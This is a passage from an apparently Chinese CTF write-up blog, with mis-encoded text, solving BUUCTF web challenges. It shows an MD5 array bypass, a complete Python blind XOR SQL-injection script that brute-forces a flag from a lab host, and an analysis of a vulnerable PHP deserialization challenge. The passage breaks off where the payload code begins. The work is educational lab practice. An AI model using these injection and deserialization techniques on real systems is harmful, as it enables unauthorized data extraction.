<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812193547427.png" title="image-20210812193547427" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812193547427.png" data-sub-html="<h2>hackbar</h2><p>image-20210812193547427</p>">
        <img
            
            loading="lazy"
            src="image-20210812193547427.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812193547427.png, image-20210812193547427.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812193547427.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812193547427.png">
    </a><figcaption class="image-caption">hackbar</figcaption>
    </figure></p>
<h3 id="level3" class="headerLink">
    <a href="#level3" class="header-mark"></a>level3</h3><p>ç¬¬ä¸‰å…³è¦æ±‚<code>$_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])</code></p>
<p>è¿™é‡Œä¼ å…¥æ•°ç»„å°±å¯ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ‰¾ä¸¤ä¸ªä¸åŒçš„ä½†æ˜¯md5ç»“æœç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œè¿™ç†è®ºä¸Šæ¥è¯´æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æˆ‘ç›®å‰è¿˜æ²¡æœ‰æŸ¥åˆ°ç°æœ‰çš„ç»“æœã€‚<figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812194016086.png" title="image-20210812194016086" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812194016086.png" data-sub-html="<h2>hackbarå‘é€Postè¯·æ±‚</h2><p>image-20210812194016086</p>">
        <img
            
            loading="lazy"
            src="image-20210812194016086.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812194016086.png, image-20210812194016086.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812194016086.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210812194016086.png">
    </a><figcaption class="image-caption">hackbarå‘é€Postè¯·æ±‚</figcaption>
    </figure></p>
<h3 id="å‚è€ƒé“¾æ¥-3" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5-3" class="header-mark"></a>å‚è€ƒé“¾æ¥ï¼š</h3><ul>
<li><a href="https://www.loongten.com/2020/02/22/ctf-php-md5/" target="_blank" rel="noopener noreferrer">CTFä¸­å¸¸è§php-MD5()å‡½æ•°æ¼æ´</a></li>
</ul>
<h2 id="0x04-ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world" class="headerLink">
    <a href="#0x04-ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack-world" class="header-mark"></a>0x04 [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210813220634873.png" title="image-20210813220634873" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210813220634873.png" data-sub-html="<h2>é¦–é¡µ</h2><p>image-20210813220634873</p>">
        <img
            
            loading="lazy"
            src="image-20210813220634873.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210813220634873.png, image-20210813220634873.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210813220634873.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210813220634873.png">
    </a><figcaption class="image-caption">é¦–é¡µ</figcaption>
    </figure></p>
<p>è¯•ä¸€ä¸‹å°±çŸ¥é“ï¼Œ<code>or</code> <code>and</code> <code>union</code> ç­‰å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½<strong>unionæ³¨å…¥</strong>æˆ–è€…<strong>æŠ¥é”™</strong>æ³¨å…¥ã€‚</p>
<p>ä»¥åŠè¾“å…¥<code>1</code>å’Œ<code>2</code>æ˜¯å¯ä»¥çœ‹åˆ°æ­£å¸¸çš„å›æ˜¾ç»“æœçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1ï¼šHello, glzjin wants a girlfriend.
</span></span><span class="line"><span class="cl">2ï¼šDo you want to be my girlfriend?
</span></span></code></pre></td></tr></table>
</div>
</div><p>googleä¹‹åå¯ä»¥çŸ¥é“ï¼Œè¿˜æœ‰ä¸€ç§æ³¨å…¥å«åš<a href="https://cbatl.gitee.io/2020/06/20/xor/" target="_blank" rel="noopener noreferrer">å¼‚æˆ–æ³¨å…¥</a>ï¼Œè¿™ä¹Ÿæ˜¯è¿™é¢˜çš„è€ƒå¯Ÿç‚¹ã€‚</p>
<p>æ‰€ä»¥æ€è·¯å°±æ˜¯ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ï¼Œé€ä½çˆ†ç ´flagçš„å†…å®¹ã€‚</p>
<p>ç›´æ¥ä¸Šè„šæœ¬ï¼Œæ³¨æ„æ¯æ¬¡è¯·æ±‚ä¹‹é—´åŠ ä¸ª<code>sleep</code>ï¼Œä¸ç„¶ä¼šå‡ºé”™ï¼Œå› ä¸ºè¯·æ±‚ä¹‹é—´é—´éš”å¤ªçŸ­ï¼Œå¯¼è‡´æ”¶åˆ°çš„ç»“æœå¯èƒ½ä¼šé¡ºåºé”™ä¹±ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">rq</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://ac7a6112-32f7-48c9-9088-66a935888686.node4.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># äºŒåˆ†æŸ¥æ‰¾å¾ˆç»†èŠ‚</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="n">b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;0^(ascii(substr((select(flag)from(flag)),</span><span class="si">{0}</span><span class="s2">,1))&gt;</span><span class="si">{1}</span><span class="s2">)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># print(payload[&#34;id&#34;])</span>
</span></span><span class="line"><span class="cl">        <span class="n">se</span> <span class="o">=</span> <span class="n">rq</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è¯·æ±‚å‘å¤ªå¿«äº†å®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œçš„sleepæ˜¯å¿…é¡»çš„</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœçŒœçš„æ•°å­—æ›´å°</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">se</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">a</span> <span class="o">=</span> <span class="n">m</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">b</span> <span class="o">=</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;m: &#34;, m, &#34;chr(m): &#34;, chr(m))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag: &#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x05-ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz" class="headerLink">
    <a href="#0x05-%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz" class="header-mark"></a>0x05 [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–çš„é¢˜ï¼Œå¯ä»¥çœ‹åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/tmp/tmpfile&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;Hello World!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Bad Hacker!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Too long!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Successful!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;[Result]: &lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">{</span><span class="s1">&#39;str&#39;</span><span class="p">}))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$obj</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®šä¹‰äº†ä¸€ä¸ª<code>FileHandler</code>ç±»ï¼Œå¹¶ä¸”ä¼šå°†æ¥å—åˆ°çš„<code>$_GET['str']</code>è¯·æ±‚å‚æ•°è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p>æ„Ÿè§‰åº”è¯¥æ˜¯è¦ååºåˆ—åŒ–å¾—åˆ°<code>FileHandler</code>å¯¹è±¡ï¼Œç„¶åé€šè¿‡<code>__construct()</code>æˆ–<code>__destruct()</code>é­”æœ¯æ–¹æ³•æ¥è¯»å–<code>flag.php</code>çš„å†…å®¹ã€‚</p>
<p>ç±»çš„<code>$op</code>å˜é‡ä¸º1å¯¹åº”å†™æ“ä½œï¼Œ2å¯¹åº”è¯»æ“ä½œã€‚</p>
<p><code>__construct()</code>é‡Œé¢å†™æ­»äº†<code>$op=&quot;1&quot;</code>ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œ<code>process()</code>ä¸­çš„è¯»å–æ“ä½œã€‚</p>
<p>ä½†æ˜¯<code>__destruct()</code>é‡Œåˆä¼šå°†<code>$op</code>ä»2å˜ä¸º1ï¼Œæ‰€ä»¥éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸€é€»è¾‘ã€‚ç»•è¿‡çš„åˆ©ç”¨ç‚¹å°±åœ¨äºï¼Œè¿™é‡Œä½¿ç”¨çš„åˆ¤æ–­é€»è¾‘æ˜¯å¼ºç›¸ç­‰<code>===</code>ï¼Œæ‰€ä»¥å°†<code>$op</code>å®šä¹‰ä¸ºæ•°å­—ç±»å‹2ï¼Œå°±å¯ä»¥ç»•è¿‡è¯¥åˆ¤æ–­ï¼ŒåŒæ—¶æ»¡è¶³<code>process()</code>å‡½æ•°ä¸­çš„<code>$op==&quot;2&quot;</code>åˆ¤æ–­ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å¼±ç›¸ç­‰ï¼Œå­˜åœ¨è‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li>
<p><del>æ–¹ä¾¿èµ·è§ï¼Œ<code>flag.php</code>åˆ©ç”¨phpçš„<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener noreferrer">ä¼ªåè®®</a><code>php://filter/read=convert.base64-encode=flag.php</code>æ¥è¯»å–</del></p>
</li>
<li>
<p>phpå¯¹äº<code>private</code>/<code>protected</code>ç±»å‹çš„æˆå‘˜å˜é‡è¿›è¡Œåºåˆ—åŒ–æ—¶ä¼šåŠ ä¸ŠåŒ…å«00å­—èŠ‚çš„ç‰¹æ®Šå†…å®¹ï¼Œä½†æ˜¯è¿™æ— æ³•é€šè¿‡<code>$is_valid()</code>åˆ¤æ–­ã€‚å¯ä»¥å°†åºåˆ—åŒ–ç»“æœä¸­çš„<code>s</code>æ›¿æ¢ä¸º<code>S</code>ï¼Œä½¿å…¶åé¢çš„å†…å®¹æ”¯æŒ16è¿›åˆ¶ï¼Œç„¶åç©ºå­—èŠ‚å†™æˆ<code>\00</code>å³å¯</p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>Object&rsquo;s private members have the class name prepended to the member name; protected members have a &lsquo;*&rsquo; prepended to the member name. These prepended values have null bytes on either side.</p>
<p><a href="https://www.php.net/manual/en/function.serialize" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/en/function.serialize</a></p>
</blockquote>
</li>
</ul>
<h3 id="payload1" class="headerLink">
    <a href="#payload1" class="header-mark"></a>payload1</h3><p>æ‰€ä»¥ï¼Œæœ€å¸¸è§„çš„payloadå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
